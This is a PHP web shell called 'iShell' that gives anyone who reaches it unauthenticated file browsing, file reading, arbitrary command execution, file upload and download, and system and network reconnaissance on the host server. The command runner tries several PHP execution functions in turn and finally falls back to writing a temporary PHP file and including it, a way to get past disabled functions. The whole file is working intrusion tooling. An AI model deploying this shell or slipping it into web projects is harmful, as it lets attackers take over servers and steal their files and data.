/* ==================================================== */
/* --------------- Coded by: ARCANGEL0 ---------------- */
/* ==================================================== */ 
<?php
error_reporting(0);
set_time_limit(0);

function isWindows() {
    return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
}

// Alternative command execution methods
function executeCommand($cmd) {
    // Try multiple execution methods
    if (function_exists('shell_exec')) {
        return shell_exec($cmd);
    }
    elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        return ob_get_clean();
    }
    elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        return ob_get_clean();
    }
    elseif (function_exists('exec')) {
        exec($cmd, $output);
        return implode("\n", $output);
    }
    elseif (isWindows() && function_exists('popen')) {
        $handle = popen($cmd, 'r');
        $output = '';
        while (!feof($handle)) {
            $output .= fread($handle, 4096);
        }
        pclose($handle);
        return $output;
    }
    elseif (function_exists('proc_open')) {
        $descriptors = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = proc_open($cmd, $descriptors, $pipes);
        $output = '';
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
        return $output;
    }
    // Fallback to backticks if nothing else works
    elseif (function_exists('`')) {
        return `$cmd`;
    }
    // Final fallback - create a temp file and use include
    else {
        $temp = tempnam(sys_get_temp_dir(), 'cmd');
        file_put_contents($temp, "<?php echo 'EXEC:'; passthru('$cmd'); ?>");
        ob_start();
        include $temp;
        unlink($temp);
        return ob_get_clean();
    }
}

function formatBytes($bytes) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, 2) . ' ' . $units[$pow];
}

// Handle actions
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $action = isset($_POST['action']) ? $_POST['action'] : '';
    
    switch ($action) {
        case 'list':
            $path = isset($_POST['path']) ? $_POST['path'] : '';
            if (is_dir($path)) {
                $files = scandir($path);
                echo "<h4>Contents of: " . htmlspecialchars($path) . "</h4><pre>";
                foreach ($files as $file) {
                    $fullpath = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . $file;
                    $perms = substr(sprintf('%o', fileperms($fullpath)), -4);
                    $size = is_dir($fullpath) ? "DIR" : formatBytes(filesize($fullpath));
                    echo htmlspecialchars("$perms\t$size\t$file") . "\n";
                }
                echo "</pre>";
            } else {
                echo "<p>Directory not found or inaccessible</p>";
            }
            break;
            
        case 'read':
            $file = isset($_POST['file']) ? $_POST['file'] : '';
            if (is_file($file) && is_readable($file)) {
                echo "<h4>Contents of: " . htmlspecialchars($file) . "</h4><pre>";
                echo htmlspecialchars(file_get_contents($file));
                echo "</pre>";
            } else {
                echo "<p>File not found or unreadable</p>";
            }
            break;
            
        case 'cmd':
            $cmd = isset($_POST['command']) ? $_POST['command'] : '';
            echo "<h4>Command: " . htmlspecialchars($cmd) . "</h4><pre>";
            echo htmlspecialchars(executeCommand($cmd));
            echo "</pre>";
            break;
            
        case 'upload':
            if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == UPLOAD_ERR_OK) {
                $target = isset($_POST['upload_path']) ? $_POST['upload_path'] : '';
                if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
                    echo "<p>File uploaded to: " . htmlspecialchars($target) . "</p>";
                } else {
                    // Try alternative upload method if move_uploaded_file fails
                    if (file_put_contents($target, file_get_contents($_FILES['upload_file']['tmp_name']))) {
                        echo "<p>File uploaded (alternative method) to: " . htmlspecialchars($target) . "</p>";
                    } else {
                        echo "<p>Upload failed</p>";
                    }
                }
            }
            break;
            
        case 'download':
            $file = isset($_POST['download_file']) ? $_POST['download_file'] : '';
            if (is_file($file) && is_readable($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                header('Content-Length: ' . filesize($file));
                readfile($file);
                exit;
            }
            break;
            
        case 'info':
            echo "<h4>System Information</h4><pre>";
            echo "PHP Version: " . phpversion() . "\n";
            echo "OS: " . php_uname() . "\n";
            echo "Server Software: " . (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A') . "\n";
            echo "Current User: " . get_current_user() . "\n";
            echo "Disabled Functions: " . ini_get('disable_functions') . "\n";
            echo "Open Basedir: " . ini_get('open_basedir') . "\n";
            echo "</pre>";
            
            echo "<h4>Network Information</h4><pre>";
            if (isWindows()) {
                echo executeCommand('ipconfig /all');
            } else {
                echo executeCommand('ifconfig -a || ip a');
            }
            echo "</pre>";
            break;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>_</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        pre { background: #f0f0f0; padding: 10px; overflow: auto; }
        .tab { display: none; }
        .tab.active { display: block; }
        .tab-button { padding: 10px; margin: 5px; cursor: pointer; background: #eee; border: none; }
        .tab-button.active { background: #ddd; font-weight: bold; }
        textarea, input[type="text"] { width: 80%; padding: 5px; margin: 5px; }
        button { padding: 5px 10px; margin: 5px; }
    </style>
    <script>
        function showTab(tabName) {
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-button').forEach(btn => {
                btn.classList.remove('active');
            });
            document.getElementById(tabName).classList.add('active');
            event.currentTarget.classList.add('active');
        }
    </script>
</head>
<body>
    <h2>iShell</h2>
    
    <div>
        <button class="tab-button active" onclick="showTab('file')">File Operations</button>
        <button class="tab-button" onclick="showTab('cmd')">Command Execution</button>
        <button class="tab-button" onclick="showTab('upload')">File Upload</button>
        <button class="tab-button" onclick="showTab('download')">File Download</button>
        <button class="tab-button" onclick="showTab('info')">System Info</button>
    </div>
    
    <div id="file" class="tab active">
        <h3>File Operations</h3>
        <form method="POST">
            <input type="hidden" name="action" value="list">
            <input type="text" name="path" placeholder="Directory path (e.g. C:\Windows\)" size="50">
            <button type="submit">List Directory</button>
        </form>
        
        <form method="POST">
           
            <input type="hidden" name="action" value="read">
            <input type="text" name="file" placeholder="File path to read" size="50">
            <button type="submit">Read File</button>
        </form>
    </div>
    
    <div id="cmd" class="tab">
        <h3>Command Execution</h3>
        <form method="POST">
            <input type="hidden" name="action" value="cmd">
            <input type="text" name="command" placeholder="Command to execute" size="50">
            <button type="submit">Execute</button>
        </form>
    </div>
    
    <div id="upload" class="tab">
        <h3>File Upload</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="file" name="upload_file">
            <input type="text" name="upload_path" placeholder="Destination path" size="50">
            <button type="submit">Upload</button>
        </form>
    </div>
    
    <div id="download" class="tab">
        <h3>File Download</h3>
        <form method="POST">
            <input type="hidden" name="action" value="download">
            <input type="text" name="download_file" placeholder="File path to download" size="50">
            <button type="submit">Download</button>
        </form>
    </div>
    
    <div id="info" class="tab">
        <h3>System Information</h3>
        <form method="POST">
            <input type="hidden" name="action" value="info">
            <button type="submit">Get System Info</button>
        </form>
    </div>
</body>
</html>
